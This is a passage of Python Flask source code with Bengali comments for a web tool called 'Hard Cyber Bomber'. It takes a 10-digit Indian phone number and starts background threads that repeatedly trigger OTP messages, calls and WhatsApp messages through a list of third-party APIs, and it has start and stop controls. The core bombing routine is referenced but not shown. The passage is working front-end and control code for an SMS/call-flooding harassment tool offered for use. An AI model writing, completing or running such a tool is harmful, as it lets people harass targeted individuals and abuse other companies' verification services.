# ========== ব্যাকগ্রাউন্ড থ্রেডে অ্যাসিঙ্ক বোম্বার চালানোর ফাংশন ==========
def run_bomb_loop(phone, apis, stop_event, delay=2):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bomb_continuously(phone, apis, stop_event, delay))
    loop.close()

# ========== ওয়েব রাউট ==========
@bp.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        delay = float(request.form.get('delay', 2))

        if not phone.isdigit() or len(phone) != 10:
            return render_template_string(HTML_FORM, result="❌ Invalid phone number (must be 10 digits)")

        # চেক করি এই নম্বরের জন্য আগে থেকে কোনো বোম্বার চলছে কিনা
        if phone in bomb_processes and bomb_processes[phone]['thread'].is_alive():
            return render_template_string(
                HTML_FORM,
                result=f"⚠️ Bombing already running for +91{phone}. Click 'Stop' to halt."
            )

        # কুল-ডাউন চেক (ঐচ্ছিক)
        current_time = time.time()
        if phone in last_used:
            time_diff = current_time - last_used[phone]
            if time_diff < COOLDOWN_SECONDS:
                remaining = int(COOLDOWN_SECONDS - time_diff)
                minutes = remaining // 60
                seconds = remaining % 60
                return render_template_string(
                    HTML_FORM,
                    result=f"⏳ This number was used recently. Please wait {minutes}m {seconds}s."
                )

        # বোম্বার শুরু করি
        last_used[phone] = current_time
        stop_event = asyncio.Event()
        apis = get_working_apis()
        thread = threading.Thread(
            target=run_bomb_loop,
            args=(phone, apis, stop_event, delay),
            daemon=True
        )
        thread.start()
        bomb_processes[phone] = {'stop_event': stop_event, 'thread': thread}

        return render_template_string(
            HTML_FORM,
            result=f"✅ Bombing started for +91{phone}. Click 'Stop' to halt."
        )

    return render_template_string(HTML_FORM, result=None)

@bp.route('/stop', methods=['POST'])
def stop_bomb():
    phone = request.form.get('phone', '').strip()
    if phone in bomb_processes:
        bomb_processes[phone]['stop_event'].set()
        # থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা (ঐচ্ছিক)
        # bomb_processes[phone]['thread'].join(timeout=2)
        del bomb_processes[phone]
        return jsonify({"status": "stopped", "phone": phone})
    else:
        return jsonify({"status": "not_found", "phone": phone}), 404

# ========== HTML টেমপ্লেট ==========
HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 Hard Cyber Bomber</title>
    <style>
        /* তোমার hard_bomber (1).py-এর CSS এখানে কপি করো – আমি সংক্ষেপ করছি */
        body { background: #0a0e17; color: #fff; font-family: 'Rajdhani', sans-serif; }
        .card { max-width: 560px; margin: 0 auto; padding: 30px; background: rgba(10,14,23,0.85); border-radius: 32px; }
        .logo { font-size: 32px; font-weight: 900; background: linear-gradient(135deg, #ff0040, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: #00f0ff; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,255,255,0.2); background: rgba(0,0,0,0.4); color: #fff; }
        .btn-fire { background: linear-gradient(135deg, #ff0040, #ff6b00); border: none; cursor: pointer; }
        .btn-stop { background: #ff3333; border: none; cursor: pointer; }
        .result-box { margin-top: 20px; padding: 15px; border-radius: 12px; background: rgba(0,255,0,0.05); color: #90ff90; }
        .result-box.error { background: rgba(255,0,0,0.05); color: #ff7a7a; }
        .flex { display: flex; gap: 10px; }
        .flex input { flex: 2; }
        .flex button { flex: 1; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">💀 Hard Cyber Bomber</div>
    <div class="subtitle">⚡ Continuous OTP · Call · WhatsApp</div>
    <form method="POST" id="bombForm">
        <input type="text" name="phone" placeholder="Enter 10-digit number" required>
        <input type="number" name="delay" value="2" step="0.5" min="0.5" placeholder="Delay (sec)">
        <div class="flex">
            <button type="submit" class="btn-fire">▶ Start Bombing</button>
            <button type="button" class="btn-stop" onclick="stopBomb()">⏹ Stop</button>
        </div>
    </form>
    {% if result %}
        <div class="result-box {% if '❌' in result or '⚠️' in result %}error{% endif %}">
            {{ result }}
        </div>
    {% endif %}
    <div style="margin-top:20px; font-size:12px; color:#3d4a66;">🔰 Developed by Arif</div>
</div>
<script>
    function stopBomb() {
        const phone = document.querySelector('input[name="phone"]').value;
        if (!phone) { alert('Enter phone number first'); return; }
        fetch('/hard_bomber/stop', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'phone=' + encodeURIComponent(phone)
        })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'stopped') {
                alert('✅ Bombing stopped for ' + data.phone);
                location.reload();
            } else {
                alert('⚠️ No active bombing for this number.');
            }
        });
    }
</script>
</body>
</html>
"""

# ========== যদি main.py-তে এই ব্লুপ্রিন্ট রেজিস্টার করতে চাও ==========
# main.py-তে files লিস্টে 'cyber_hard_bomber' যোগ করো